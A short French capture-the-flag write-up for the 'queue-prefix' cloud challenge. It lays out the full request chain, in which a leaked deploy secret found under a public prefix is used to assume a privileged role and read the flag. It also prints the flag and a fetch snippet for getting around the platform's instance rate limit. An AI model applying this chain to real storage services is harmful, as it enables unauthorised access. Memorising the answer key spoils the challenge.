# queue-prefix

## Challenge
**Catégorie :** cloud  **Auteur :** hibris / Clawd  **Points :** 50 (dynamique)
**Instance :** par équipe, HTTP  **Format :** `NCTF{...}`

> Cible : `queue-prefix` — le service de files de messages de la plateforme cloud,
> qui transporte les tâches entre composants. Piste : *Préfixe public → credential
> fuité → escalade de rôle*. Flag sur le filesystem, served by no route.

## Résolution
Variante exacte de la série `*-prefix` (cf. [registry-prefix](registry-prefix.md)).
Chaîne identique, flag différent (rotaté) :

```
GET /list?prefix=public/        → public/readme.txt, public/backup-notes.txt
GET /get?key=public/backup-notes.txt
                                → deploy_secret=AKIA8dd71ec97c03bc578a16
GET /assume?secret=AKIA8dd71ec97c03bc578a16
                                → role-ytEbarfCCLhjMXNhmXM1QS3aecvEfpJe (role backup-restore)
GET /get?key=private/flag  (X-Role-Token: role-ytEbarfCCLhjMXNhmXM1QS3aecvEfpJe)
                                → NCTF{377bd20118578742b153a027}
```

Résolu automatiquement : `python3 -I solve_prefix.py <url_instance>`.

## Spawn (méthode légère, anti-rate-limit)
Au lieu de la modale (qui poll `/status` et épuise le quota 6/60 s partagé équipe),
spawn direct en 1 requête, l'URL est dans la réponse :
```js
fetch('/plugins/team_instancer/spawn',{method:'POST',
  headers:{'CSRF-Token':window.init.csrfNonce,'Content-Type':'application/json'},
  body:JSON.stringify({challenge_id:45})})
// → {"connection":{"url":"https://<rand>.t.ctf.tg/"},"status":"running","success":true}
```

## Flag
`NCTF{377bd20118578742b153a027}`
